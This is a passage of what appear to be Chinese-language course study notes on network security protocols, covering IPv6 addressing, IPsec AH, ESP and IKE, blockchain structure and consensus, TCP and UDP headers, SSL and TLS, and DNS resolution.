title="IPv6地址"></a>IPv6地址</h4><ul><li><p><strong>长度</strong>：128位</p></li><li><p><strong>表示方法</strong>：八组16位十六进制数，用冒号分隔，例如：<code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></p></li><li><p>简写规则</p><ul><li><p>省略前导零：<code>2001:db8:85a3:0:0:8a2e:370:7334</code></p></li><li><p>连续零压缩：<code>2001:db8:85a3::8a2e:370:7334</code></p></li></ul></li></ul><h4 id="IPv6端口"><a href="#IPv6端口" class="headerlink" title="IPv6端口"></a>IPv6端口</h4><ul><li><p>端口号范围</p><ul><li>公认端口：0-1023</li><li>注册端口：1024-49151</li><li>动态&#x2F;私有端口：49152-65535</li></ul></li></ul><h4 id="地址类型"><a href="#地址类型" class="headerlink" title="地址类型"></a>地址类型</h4><h2 id="3-4AH协议，定义及结构"><a href="#3-4AH协议，定义及结构" class="headerlink" title="3.4AH协议，定义及结构"></a>3.4AH协议，定义及结构</h2><h4 id="3-4-1【名词解释】AH协议定义"><a href="#3-4-1【名词解释】AH协议定义" class="headerlink" title="3.4.1【名词解释】AH协议定义"></a>3.4.1【名词解释】AH协议定义</h4><p><img src="C:/Users/86187/img/image-20240629232639075.png" alt="image-20240629232639075"></p><h4 id="3-4-2-AH协议结构"><a href="#3-4-2-AH协议结构" class="headerlink" title="3.4.2 AH协议结构"></a>3.4.2 AH协议结构</h4><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629233452223.png" alt="image-20240629233452223"></p><p><img src="C:/Users/86187/img/image-20240629233550876.png" alt="image-20240629233550876"></p><h2 id="3-5ESP协议，定义及结构"><a href="#3-5ESP协议，定义及结构" class="headerlink" title="3.5ESP协议，定义及结构"></a>3.5ESP协议，定义及结构</h2><h4 id="3-5-1【名词解释】ESP协议定义"><a href="#3-5-1【名词解释】ESP协议定义" class="headerlink" title="3.5.1【名词解释】ESP协议定义"></a>3.5.1【名词解释】ESP协议定义</h4><p><img src="C:/Users/86187/img/image-20240629232652779.png" alt="image-20240629232652779"></p><h4 id="3-5-2ESP协议结构"><a href="#3-5-2ESP协议结构" class="headerlink" title="3.5.2ESP协议结构"></a>3.5.2ESP协议结构</h4><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240629233601424.png" alt="image-20240629233601424"></p><p><strong><img src="C:/Users/86187/img/image-20240629233622430.png" alt="image-20240629233622430"></strong></p><h2 id="3-6网络密钥交换，定义及结构"><a href="#3-6网络密钥交换，定义及结构" class="headerlink" title="3.6网络密钥交换，定义及结构"></a>3.6网络密钥交换，定义及结构</h2><h3 id="IPsec密钥管理"><a href="#IPsec密钥管理" class="headerlink" title="IPsec密钥管理"></a>IPsec密钥管理</h3><ul><li>手动（manual）：管理员为每个系统手动配 置所需密钥</li><li>自动（automated）：系统通过IKE（Internet  Key Exchange）协议自动为SA创建密钥</li></ul><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>Internet密钥交换（Internet Key Exchange, IKE）是用于建立安全通信会话的协议，广泛用于虚拟专用网络（VPN）。它通过动态协商和建立安全关联（SA），在两端设备之间安全地交换加密密钥。</p><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>IKE协议包括两个主要版本：IKEv1和IKEv2。以下是IKE的基本结构和工作过程：</p><ol><li><p><strong>阶段1（Phase 1）</strong>：建立安全关联和共享密钥</p><ul><li><p><strong>模式</strong>：主要有主模式（Main Mode）和野蛮模式（Aggressive Mode）。</p></li><li><p>步骤</p><p>：</p><ol><li><strong>协商加密算法和哈希函数</strong>：双方协商用于保护通信的算法。</li><li><strong>DH密钥交换</strong>：使用Diffie-Hellman算法生成共享密钥。</li><li><strong>身份验证</strong>：通过预共享密钥（PSK）、数字证书或其他方法验证身份。</li></ol></li></ul></li><li><p><strong>阶段2（Phase 2）</strong>：建立IPsec SA</p><ul><li><p><strong>快速模式（Quick Mode）</strong>：在已建立的安全通道上，协商IPsec的具体参数，如ESP（封装安全有效载荷）或AH（认证头）的加密和哈希算法。</p></li><li><p>步骤</p><p>：</p><ol><li><strong>协商IPsec SA参数</strong>：选择具体的加密和哈希算法。</li><li><strong>共享密钥生成</strong>：基于阶段1的共享密钥生成新的会话密钥。</li><li><strong>建立IPsec SA</strong>：创建保护数据流的IPsec安全关联。</li></ol></li></ul></li></ol><h4 id="工作过程"><a href="#工作过程" class="headerlink" title="工作过程"></a>工作过程</h4><ol><li><strong>初始协商</strong>：客户端和服务器通过IKE协议进行初始协商，选择合适的加密和哈希算法。</li><li><strong>密钥交换</strong>：双方通过DH密钥交换生成共享密钥。</li><li><strong>身份验证</strong>：双方通过预先配置的PSK或数字证书验证对方身份。</li><li><strong>建立SA</strong>：完成初始协商和身份验证后，双方建立安全关联（SA）。</li><li><strong>保护通信</strong>：使用协商的算法和生成的密钥保护实际的数据通信。</li></ol><h4 id="安全功能"><a href="#安全功能" class="headerlink" title="安全功能"></a>安全功能</h4><ul><li><strong>加密</strong>：通过协商的对称加密算法（如AES）保护数据的机密性。</li><li><strong>完整性</strong>：通过哈希算法（如SHA-256）确保数据未被篡改。</li><li><strong>身份验证</strong>：确保通信双方的身份真实性。</li><li><strong>密钥管理</strong>：自动生成和管理密钥，确保密钥的安全性和生命周期管理。</li></ul><h1 id="四、-区块链安全"><a href="#四、-区块链安全" class="headerlink" title="四、    区块链安全"></a>四、    区块链安全</h1><h2 id="4-1-！区块链结构-，链式结构、哈希链、区块结构"><a href="#4-1-！区块链结构-，链式结构、哈希链、区块结构" class="headerlink" title="4.1 &#x3D;&#x3D;！区块链结构&#x3D;&#x3D;，链式结构、哈希链、区块结构"></a>4.1 &#x3D;&#x3D;！区块链结构&#x3D;&#x3D;，链式结构、哈希链、区块结构</h2><h4 id="4-1-1-区块链的结构特点："><a href="#4-1-1-区块链的结构特点：" class="headerlink" title="4.1.1 区块链的结构特点："></a>4.1.1 区块链的结构特点：</h4><p> 区块链是一种链式结构，区块按时间顺序相连。 </p><p>区块链分叉现象是指由于网络传输延迟，区块链矿工节点可能在同一时间点产生两个或多个有 效的区块。</p><p> 硬分叉是软件升级是新老软件不兼容，旧节点不愿意接受新节点产生的区块所形成的分叉现 象。 </p><p>软分叉是当新共识规则发布后，在去中心化架构中节点不一定要升级到新的共识规则，新老节 点最终都接受新老规则产出的区块并相互认可。</p><h4 id="链式结构、哈希链（PPT未涉及很多，搜的）"><a href="#链式结构、哈希链（PPT未涉及很多，搜的）" class="headerlink" title="链式结构、哈希链（PPT未涉及很多，搜的）"></a>链式结构、哈希链（PPT未涉及很多，搜的）</h4><p>区块链是一种按时间顺序将数据区块以顺序相连的方式组合成的链式数据结构。区块链构建了一种分布式的价值传输网络，允许缺乏信任的个体之间进行价值互联和数据共享。</p><p><strong>1. 链式结构:</strong></p><ul><li>区块链就像一条链条，由一个个区块（Block）链接而成。</li><li>每个区块都包含着交易信息、时间戳、哈希值等数据。</li><li>区块之间通过<strong>哈希指针</strong>连接，形成一条不可断裂的时间链条。</li></ul><p><strong>2. 哈希链:</strong></p><ul><li>每个区块都包含<strong>前一个区块的哈希值</strong>，就像每个区块都握着前一个区块的手，形成一条牢固的链条。</li><li>任何一个区块数据的改动都会导致其哈希值改变，进而影响后续所有区块的哈希值，很容易被发现。</li><li>这种链式结构和哈希指针的结合，保证了区块链数据的不可篡改性。</li></ul><h4 id="4-1-2-区块结构"><a href="#4-1-2-区块结构" class="headerlink" title="4.1.2 区块结构"></a>4.1.2 区块结构</h4><p>区块是容纳了多笔交易的数据单元。每个区块包含两种数据结构，分别是<strong>区块头和区块体。</strong></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630003659213.png" alt="image-20240630003659213"></p><h2 id="4-2！-区块链主要协议，共识协议、地址生成"><a href="#4-2！-区块链主要协议，共识协议、地址生成" class="headerlink" title="4.2！&#x3D;&#x3D;区块链主要协议，共识协议、地址生成&#x3D;&#x3D;"></a>4.2！&#x3D;&#x3D;<strong>区块链主要协议，</strong>共识协议、地址生成&#x3D;&#x3D;</h2><h4 id="区块链主要协议"><a href="#区块链主要协议" class="headerlink" title="区块链主要协议"></a>区块链主要协议</h4><ul><li><strong>比特币（Bitcoin）</strong>：首个区块链协议，专注于点对点数字货币交易。</li><li><strong>以太坊（Ethereum）</strong>：支持智能合约和去中心化应用的平台。</li></ul><h4 id="共识协议"><a href="#共识协议" class="headerlink" title="共识协议"></a>共识协议</h4><ul><li><strong>工作量证明（Proof of Work, PoW）</strong>：通过计算复杂数学问题来达成共识（如比特币）。</li><li><strong>权益证明（Proof of Stake, PoS）</strong>：通过持有代币数量和时间来达成共识（如以太坊2.0）。</li><li><strong>委托权益证明（Delegated Proof of Stake, DPoS）</strong>：通过投票选出代表节点进行区块验证（如EOS）。</li><li><strong>拜占庭容错（Byzantine Fault Tolerance, BFT）</strong>：处理分布式系统中的拜占庭将军问题（如Hyperledger Fabric）。</li></ul><h4 id="地址生成"><a href="#地址生成" class="headerlink" title="地址生成"></a>地址生成</h4><ul><li><strong>私钥</strong>：随机生成的256位数，用于签名交易。</li><li><strong>公钥</strong>：通过椭圆曲线加密算法从私钥生成，用于生成区块链地址。</li><li><strong>地址</strong>：通过哈希函数（如SHA-256和RIPEMD-160）对公钥进行哈希处理生成，用于接收和发送区块链资产。</li></ul><p><strong>4.2.1. 共识协议：维护区块链一致性的“仲裁机制”</strong></p><p>共识协议是区块链网络中所有节点就数据状态达成一致的机制，它确保了在去中心化的网络中，只有一个版本的区块链被认为是有效的，即使部分节点出现故障或恶意行为，也能保证整个网络的稳定和安全。</p><p>常见的共识协议：</p><ul><li><strong>工作量证明（Proof of Work，PoW）：</strong> 比特币使用的共识机制，矿工通过竞争计算复杂的数学问题来获得记账权，最先解决问题的矿工将获得奖励并将其打包的区块添加到区块链中。</li><li><strong>权益证明（Proof of Stake，PoS）：</strong> 根据节点持有的代币数量和时间来分配记账权，持币越多、时间越长的节点更有可能被选中成为验证者。</li><li><strong>授权拜占庭容错（Delegated Proof of Stake，DPoS）：</strong> 由代币持有者投票选举出代表节点，由这些代表节点负责验证交易和生成区块。</li><li><strong>实用拜占庭容错（Practical Byzantine Fault Tolerance，PBFT）：</strong> 一种基于消息传递的共识机制，通过多轮投票来达成共识，容忍一定数量的恶意节点。</li></ul><p><strong>4.2.2. 地址生成：保障资产安全的“身份标识”</strong></p><p>区块链地址是用户在区块链网络上的身份标识，类似于银行账号，用于接收和发送加密货币或数字资产。地址生成机制确保了每个地址的唯一性和安全性。</p><p>常见的地址生成方式：</p><ul><li><strong>基于公钥加密：</strong> 通过非对称加密算法生成一对密钥：私钥和公钥。公钥可以公开分享，用于接收资产，而私钥必须妥善保管，用于授权交易。区块链地址通常是由公钥经过一系列哈希运算和编码生成的。</li><li><strong>哈希函数：</strong> 使用哈希函数对用户的公钥或其他身份信息进行运算，生成一个固定长度的字符串作为地址。</li></ul><p><strong>地址生成机制的特点：</strong></p><ul><li><strong>唯一性：</strong> 每个地址都是唯一的，可以避免资产混淆和误操作。</li><li><strong>安全性：</strong> 地址生成算法保证了地址的随机性和不可预测性，难以被破解或伪造。</li><li><strong>匿名性：</strong> 地址本身不直接包含用户的真实身份信息，保护用户隐私。</li></ul><h2 id="4-3-节点运行机制，-P2P点对点网络"><a href="#4-3-节点运行机制，-P2P点对点网络" class="headerlink" title="4.3 节点运行机制，&#x3D;&#x3D;P2P点对点网络&#x3D;&#x3D;"></a>4.3 节点运行机制，&#x3D;&#x3D;P2P点对点网络&#x3D;&#x3D;</h2><p>P2P 对等式网络，又称点对点技术，是去中心化、依靠用户群交换信息的互联网体系，它的作用在于，减低以往网路传输中的节点，以降低资料遗失的风险。与有中心服务器的中央网络系统不同，对等网络的每个用户端既是一个节点，也有服务器的功能，任何一个节点无法直接找到其他节点，必须依靠其户群进行信息交流</p><p>网络层是系统节点之间进行数据交互的组成部分, 目前大多数区块链网络层采用的是分布式 P2P 组网架构, 依赖 P2P 组网架构, 区块链节点可以在无须依赖可信的第三方节点来完成通信</p><p>网络层是系统节点之间进行数据交互的组成部分, 目前大多数区块链网络层采用的是分布式 P2P 组网架构, 依赖 P2P 组网架构, 区块链节点可以在无须依赖可信的第三方节点来完成通信</p><p>区块链网络层的主要功能是为共识层提供可靠、 对等和安全的网络结构及通信环境</p><p>P2P网络：是指两个或多个对等节点之间直接共享文件的网络架构, 在区块链网络中各个节点无主次之分。然而，安全性不高的节点很容易受到攻击者的直接攻击从而带来隐私数据的泄露<br>目前存在多种威胁网络层安全的攻击方式：日蚀攻击、BGP劫持攻击、窃听攻击和拒绝服务攻击等</p><h1 id="五、-传输层安全"><a href="#五、-传输层安全" class="headerlink" title="五、    传输层安全"></a>五、    传输层安全</h1><h2 id="5-1传输层协议，UDP协议、TCP协议"><a href="#5-1传输层协议，UDP协议、TCP协议" class="headerlink" title="5.1传输层协议，UDP协议、TCP协议"></a>5.1传输层协议，UDP协议、TCP协议</h2><h4 id="5-1-1-UDP协议"><a href="#5-1-1-UDP协议" class="headerlink" title="5.1.1 UDP协议"></a>5.1.1 UDP协议<img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630005648981.png" alt="image-20240630005648981"></h4><p>IP层的报头指明了源主机和目的主机地址，而UDP层的报头指明了主机上的源端口和目的端口。<br>UDP传输的段（segment）有8个字节的报头和有效载荷字段构成。</p><p>应用程序访问UDP层然后使用IP层传送数据报。IP数据包的数据部分即为UDP数据报。IP层的报头指明了源主机和目的主机地址，而UDP层的报头指明了主机上的源端口和目的端口。UDP传输的段（segment）有8个字节的报头和有效载荷字段构成。<br>源端口：源端口号，占2字节。由于UDP协议提供的是不可靠的数据传输服务，所有不需要应答，因而UDP的源端口号是可选的，如果不用，设置为0.<br>目的端口：目的端口号，占2字节。</p><p>长度：UDP用户数据报的长度（包括首部和数据部分在内的总的字节数），占2字节。最小值是8（数据报中只有固定的首部，没有数据）<br>检验和：防止UDP用户数据报在传输中出错，占2字节。由于UDP不保证可靠性，所有该字段是可选的。</p><p>UDP协议使用报头中的校验值来保证数据的安全。<br>校验值首先在数据发送方通过特殊的算法计算得出，在传递到接收方之后，还需要再重新计算。<br>如果某个数据报在传输过程中被第三方篡改或者由于线路噪音等原因受到损坏，发送和接收方的校验计算值将不会相符，由此UDP协议可以检测是否出错。<br>IP数据报的检验和只检验IP数据报的首部。</p><h4 id="5-1-2-TCP协议"><a href="#5-1-2-TCP协议" class="headerlink" title="5.1.2 TCP协议"></a>5.1.2 TCP协议</h4><p>标志符（9比特长）</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630005658177.png" alt="image-20240630005658177"></p><p>TCP连接有关的控制比特（标志位）：<br>确认位（ACK）：当ACK&#x3D;1时，确认号字段才有效；当ACK&#x3D;0时，确认号无效。<br>复位号（RST）：当RST&#x3D;1时，表明TCP连接中出现严重差错，如由于主机崩溃或其他原因，必须释放连接，然后再重新建立传输连接。<br>同步位（SYN）：在连接建立时用来同步序号。当SYN&#x3D;1而ACK&#x3D;0时，表明这是一个连接请求报文段。对方若同意建立连接，则应在响应的报文段中使SYN&#x3D;1和ACK&#x3D;1.<br>终止位（FIN）：用来释放一个连接。当FIN&#x3D;1时，表明此报文段的发送端的数据已发送完毕，并要求释放传输连接。</p><h2 id="5-2！-SSL体系结构、协议模式，握手协议"><a href="#5-2！-SSL体系结构、协议模式，握手协议" class="headerlink" title="5.2！&#x3D;&#x3D;SSL体系结构、协议模式，握手协议&#x3D;&#x3D;"></a>5.2！&#x3D;&#x3D;<strong>SSL</strong>体系结构、协议模式，握手协议&#x3D;&#x3D;</h2><h4 id="5-2-1-SSL体系结构、协议模式"><a href="#5-2-1-SSL体系结构、协议模式" class="headerlink" title="5.2.1 SSL体系结构、协议模式"></a>5.2.1 <strong>SSL</strong>体系结构、协议模式</h4><p><strong>SSL有两种使用模式：</strong><br>一种是将SSL（或TLS）作为传输层之上、应用层之下的一个独立协议子层，对应用程序完全透明；<br>另一种是将SSL（或TLS）嵌入到特定的应用里，比如绝大多数浏览器和Web服务器中都实现了SSL（或TLS）协议。</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630005914988.png" alt="image-20240630005914988"></p><p>SSL分两个子层，下面一层是SSL记录协议（Record Protocol），为高层协议，如HTTP协议，提供基本的安全服务；</p><p>上面一层包括三个协议：SSL握手协议（Handshake Protocol）、SSL密码变更规格协议（Change Cipher Specification Protocol）和SSL报警协议（Alert Protocol），这些协议对SSL信息交换进行管理</p><p>有了SSL后，应用层数据不再直接传递给传输层，而是传递给SSL层，由SSL层对从应用层收到的数据进行加密，并增加自己的SSL首部</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630005943636.png" alt="image-20240630005943636"></p><p>SSL几个协议之间的关系是：<br>使用握手协议协商加密和MAC算法以及保密密钥，以及身份认证<br>使用密码变更规格协议变更连接上使用的密码机制<br>使用记录协议对交换的数据进行加密和签名<br>使用报警协议定义数据传输过程中出现的问题并通知相关方</p><h4 id="5-2-2-握手协议"><a href="#5-2-2-握手协议" class="headerlink" title="5.2.2 握手协议"></a>5.2.2 握手协议</h4><p>SSL握手协议是客户端和服务器用SSL连接通信时使用的第一个子协议，在开始传输上层应用数据之前使用。<br><strong>该协议允许服务器和客户端相互验证，协商加密和MAC算法以及加密密钥，用来保护在SSL记录协议中发送的数据</strong></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630010230868.png" alt="image-20240630010230868"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630010246606.png" alt="image-20240630010246606"></p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630010253818.png" alt="image-20240630010253818"></p><h2 id="5-3TLS结构与协议模式，TLS与SSL差异"><a href="#5-3TLS结构与协议模式，TLS与SSL差异" class="headerlink" title="5.3TLS结构与协议模式，TLS与SSL差异"></a>5.3TLS结构与协议模式，TLS与SSL差异</h2><h4 id="5-3-1-TLS结构与协议模式"><a href="#5-3-1-TLS结构与协议模式" class="headerlink" title="5.3.1 TLS结构与协议模式"></a>5.3.1 TLS结构与协议模式</h4><p><img src="https://img-blog.csdnimg.cn/20210422105900778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUwNjY4ODUx,size_16,color_FFFFFF,t_70" alt="img"></p><p>TLS（Transport Layer Security，传输层安全协议）是互联网上应用最广泛的安全协议之一，它为网络通信提供身份验证、加密和数据完整性保护，确保信息在传输过程中不被窃听、篡改或伪造。</p><h4 id="TLS结构"><a href="#TLS结构" class="headerlink" title="TLS结构"></a>TLS结构</h4><ol><li><strong>记录协议（Record Protocol）</strong>：基础协议，负责分段、压缩、加密和传输数据。</li><li><strong>握手协议（Handshake Protocol）</strong>：建立安全连接，协商加密算法、认证客户端和服务器、生成会话密钥。</li><li><strong>警报协议（Alert Protocol）</strong>：处理和传递警报信息（如错误和警告），终止连接。</li><li><strong>变更密码规范协议（Change Cipher Spec Protocol）</strong>：指示通信双方开始使用协商的加密算法和密钥。</li><li><strong>应用数据协议（Application Data Protocol）</strong>：传输经过加密和完整性保护的应用层数据。</li></ol><p><strong>一、TLS 结构：分层协作，各司其职</strong></p><p>TLS 协议采用分层结构，主要分为两层：</p><ol><li><strong>TLS 记录协议（TLS Record Protocol）：</strong> 负责数据的加密、解密、完整性校验和消息认证，确保数据在传输过程中的机密性和完整性。</li><li><strong>TLS 握手协议（TLS Handshake Protocol）：</strong> 负责在客户端和服务器之间建立安全连接，协商加密算法、交换密钥等，为后续数据传输做好准备。</li></ol><p><strong>TLS 协议栈：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c">应用层<br>  <span class="hljs-string">|</span><br>  <span class="hljs-string">|  HTTP, SMTP, FTP 等</span><br>  <span class="hljs-string">|</span><br>  <span class="hljs-string">|——————— TLS ———————</span><br>  <span class="hljs-string">|</span><br>传输层  <span class="hljs-string">|  TLS 记录协议</span><br>  <span class="hljs-string">|  TLS 握手协议</span><br>  <span class="hljs-string">|</span><br>网络层  <span class="hljs-string">|  IP</span><br>  <span class="hljs-string">|</span><br>数据链路层<br>  <span class="hljs-string">|</span><br>物理层<br></code></pre></td></tr></table></figure><p><strong>二、TLS 协议模式：灵活应对不同场景</strong></p><p>TLS 协议支持多种协议模式，以适应不同的应用场景和安全需求：</p><p><strong>1. TLS 握手模式：</strong></p><ul><li><strong>单向认证：</strong> 只有服务器需要验证身份，客户端不需要验证。例如，访问 HTTPS 网站时，浏览器只需要验证网站的证书，而网站不需要验证用户的身份。</li><li><strong>双向认证：</strong> 客户端和服务器都需要验证身份，例如，访问网上银行时，银行需要验证用户的身份，用户也需要验证银行的证书。</li></ul><p><strong>2. TLS 会话模式：</strong></p><ul><li><strong>会话恢复：</strong> 在已经建立连接的基础上，快速恢复之前的会话状态，减少握手过程的开销，提高通信效率。</li></ul><h4 id="5-3-2-TLS与SSL差异"><a href="#5-3-2-TLS与SSL差异" class="headerlink" title="5.3.2 TLS与SSL差异"></a>5.3.2 TLS与SSL差异</h4><p><strong>版本号</strong><br>TLS 1.0 的主版本为3, 次版本为1，而与之对应的SSL 3.0的主版本为3，次版本为0。TLS 1.1的主版本为3，次版本为2<br>消息认证码<br>TLS的MAC与SSL3.0的MAC有两点不同：TLS使用RFC2104中定义的HMAC算法；TLS使用称为“PRF”的伪随机函数</p><p><strong>报警码</strong><br>除no_certificate外，TLS继承了SSL3.0中定义的所有报警码。另外，还定义了新的报警码<br>密码套件<br>TLS和SSL3.0存在细小差别，即TLS不支持Fortezza密钥交换、加密算法，而SSL3.0是支持的</p><p><strong>客户端证书类型</strong><br>在CertificateRequest消息中，TLS支持SSL3.0中定义的rsa_sign, dss_sign, rsa_fixed_dh和dss_fixed_dh证书，但不支持SSL 3.0支持的rsa_ephemeral_dh, dss_ephemeral和fortezza_kea证书</p><p><strong>CertificateVerify消息</strong><br>TLS在CertificateVerify消息中计算MD5和SHA-1散列码时，计算的输入与SSL 3.0有少许差别，但安全性相当<br>仅对handshake_message进行MD5或SHA-1散列值计算，而在SSL 3.0中散列值计算还包括主密钥和填充，但这些额外信息似乎并没有增加安全性</p><p><strong>Finished消息</strong><br>TLS在Finished消息中计算MD5和SHA-1散列码时，计算的输入与SSL 3.0有少许差别，但安全性相当</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630010416374.png" alt="image-20240630010416374"></p><p><strong>密码计算</strong><br>TLS和SSL 3.0在计算主密钥值（master secret）时采用的方式不同，过程如下：</p><p><img src="http://azure.wangsiyue.online:9001/blogimg/blogs/image-20240630010424630.png" alt="image-20240630010424630"></p><p><strong>填充</strong><br>在SSL中，填充后的数据长度正好是分组加密算法中分组长度的最小整数倍。而TLS填充后的数据长度可以是分组长度的任意整数倍（但填充最大长度为255字节）。<br>例如，如果明文（如果使用了压缩算法则是压缩后的明文）加MAC再加上表示填充长度的1个字节共79字节，则填充长度按字节计算时可以是1、9、17、25等，直到249。这种可变填充长度可以防止基于对报文长度进行分析的攻击</p><h1 id="六、-DNS安全"><a href="#六、-DNS安全" class="headerlink" title="六、    DNS安全"></a>六、    DNS安全</h1><h2 id="6-1DNS服务，定义及原理"><a href="#6-1DNS服务，定义及原理" class="headerlink" title="6.1DNS服务，定义及原理"></a>6.1DNS服务，定义及原理</h2><h4 id="6-1-1-DNS服务定义"><a href="#6-1-1-DNS服务定义" class="headerlink" title="6.1.1 DNS服务定义"></a>6.1.1 DNS服务定义</h4><p>【名词解释】域名系统（Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p>DNS使用UDP端口53。</p><h4 id="6-1-2-DNS服务原理（找不到，网上搜的）"><a href="#6-1-2-DNS服务原理（找不到，网上搜的）" class="headerlink" title="6.1.2 DNS服务原理（找不到，网上搜的）"></a>6.1.2 DNS服务原理（找不到，网上搜的）</h4><p><strong>DNS服务的工作原理可以概括为以下步骤：</strong></p><ol><li><strong>用户访问网站：</strong> 当你在浏览器地址栏输入域名并按下回车键时，浏览器会首先检查本地缓存中是否保存着该域名的IP地址。</li><li><strong>本地DNS查询：</strong> 如果本地缓存中没有找到，浏览器会向本地DNS服务器发送查询请求。本地DNS服务器通常由网络服务提供商（ISP）提供，它会尝试解析该域名。</li><li><strong>根域名服务器查询：</strong> 如果本地DNS服务器也无法解析该域名，它会向根域名服务器发送查询请求。根域名服务器是DNS系统的最高层级，它存储着所有顶级域名（例如 .com、.net、.org 等）的权威DNS服务器地址。</li><li><strong>顶级域名服务器查询：</strong> 根域名服务器会告诉本地DNS服务器该顶级域名的权威DNS服务器地址，本地DNS服务器再向该服务器发送查询请求。</li><li><strong>权威域名服务器查询：</strong> 权威域名服务器存储着该域名的完整DNS记录，包括对应的IP地址。它会将IP地址返回给本地DNS服务器。</li><li><strong>本地DNS服务器缓存：</strong> 本地DNS服务器收到IP地址后，会将其缓存起来，以便下次查询时可以直接使用，同时将IP地址返回给浏览器。</li><li><strong>浏览器访问网站：</strong> 浏览器收到IP地址后，就可以直接与该IP地址对应的Web服务器建立连接，并获取网页内容。</li></ol><h2 id="6-2-DNS运营机制"><a href="#6-2-DNS运营机制" class="headerlink" title="6.2 DNS运营机制"></a>6.2 DNS运营机制</h2><p><strong>1. 分层结构:</strong></p><p>DNS采用分层结构来管理海量域名信息，主要分为以下几层：</p><ul><li><strong>根域名服务器：</strong> 位于DNS树状结构的最顶层，全球只有13台根服务器，负责管理所有顶级域名（如 .com、.net、.org）的权威域名服务器地址。</li><li><strong>顶级域名服务器：</strong> 负责管理特定顶级域名下的所有域名信息，例如 .com 顶级域名服务器负责管理所有以 .com 结尾的域名。</li><li><strong>权威域名服务器：</strong> 由域名注册商或网站管理员维护，存储着特定域名的完整DNS记录，包括对应的IP地址、邮件服务器地址等。</li><li><strong>本地DNS服务器：</strong> 由网络服务提供商（ISP）提供，用户设备首先向本地DNS服务器发起域名解析请求。</li></ul><p><strong>2. 递归查询与迭代查询：</strong></p><ul><li><strong>递归查询：</strong> 用户向本地DNS服务器发起查询请求，本地DNS服务器负责递归地向上一级DNS服务器查询，直到找到目标域名的IP地址并返回给用户。</li><li><strong>迭代查询：</strong> 本地DNS服务器向上一级DNS服务器查询时，如果上一级服务器无法解析该域名，则会返回一个更接近目标域名权威服务器的地址，本地DNS服务器需要根据返回的地址继续迭代查询，直到找到最终结果。</li></ul><p><strong>3. 缓存机制：</strong></p><p>为了提高域名解析效率，DNS系统在各个层级都设置了缓存机制：</p><ul><li><strong>本地DNS服务器缓存：</strong> 缓存近期解析过的域名记录，下次查询相同域名时可以直接返回结果。</li><li><strong>权威域名服务器缓存：</strong> 缓存自身管理的域名记录，提高解析速度。</li></ul><p><strong>4. 全球协作：</strong></p><ul><li><strong>根域名服务器：</strong> 由互联网名称与数字地址分配机构（ICANN）管理，全球同步更新，确保域名解析的准确性。</li><li><strong>顶级域名服务器：</strong> 由各个机构或组织负责运营维护，例如 Verisign 运营 .com 顶级域名服务器。</li><li><strong>权威域名服务器：</strong> 由域名注册商或网站管理员负责维护，保证域名记录的及时更新。</li></ul><p><strong>5. 安全机制：</strong></p><ul><li><strong>DNSSEC (DNS Security Extensions)：</strong> 通过数字签名验证DNS数据的真实性和完整性，防止域名劫持和缓存污染等攻击</li></ul><h2 id="6-3-域名系统，主要流转流程"><a href="#6-3-域名系统，主要流转流程" class="headerlink" title="6.3 !&#x3D;&#x3D;域名系统，主要流转流程&#x3D;&#x3D;"></a>6.3 !&#x3D;&#x3D;<strong>域名系统</strong>，主要流转流程&#x3D;&#x3D;</h2><p>DNS查询有两种方式：递归和迭代。</p><p>DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果</p><p>DNS服务器之间一般采用迭代查询方式。</p><p><strong>浏览器导航栏中键入网站的域名或单击 URL 链接后，浏览器将启动 DNS 解析过程来查找这些 IP 地址</strong><br><strong>浏览器会向“解析器”(resolver)发送一个查询，解析器会在本地保留以前查询过的问题的答案副本（缓存），如果存在直接响应浏览器。如果缓存中没有，则解析器会执行完整的 DNS 解析过程。</strong></p><p><strong>向 13 个根服务器中的任意一个根服务器发送包含网站域名的查询，询问该网站对应的 IP 地址。收到查询请求的根服务器会返回一个“引荐”（referral）作为响应，包含网站域名 TLD 的名称服务器的列表</strong></p><p><strong>将同一查询发送到引荐响应中收到的其中一个 TLD 的名称服务器。TLD 名称服务器通常也只包含它们负责的域的名称服务器信息。因此，就像发送到根服务器的查询一样，发送到 TLD 名称服务器的查询也会收到引荐响应，提供一个有关所查询的二级域的名称服务器列表。</strong></p><p><strong>此解析过程将一直继续，直到将查询发送到符合以下条件之一的域名服务器：拥有答案，即Web 服务器的 IP 地址；或者域名服务器能够发布权威性声明，表示所查询的域名不存在。</strong></p><p>例如，如果您尝试访问网站 <a href="http://www.example.com,您的解析器将向其中一个根服务器发送一个查询,询问该域名的/">www.example.com，您的解析器将向其中一个根服务器发送一个查询，询问该域名的</a> IP 地址，此时，根服务器将返回一个列出了 “.com”（我们示例中的 TLD）的所有名称服务器的列表。</p><p>如前例，解析器将向其中一个“.com”名称服务器发送对“www. example.com”的查询，询问该域名的 IP 地址，“.com” 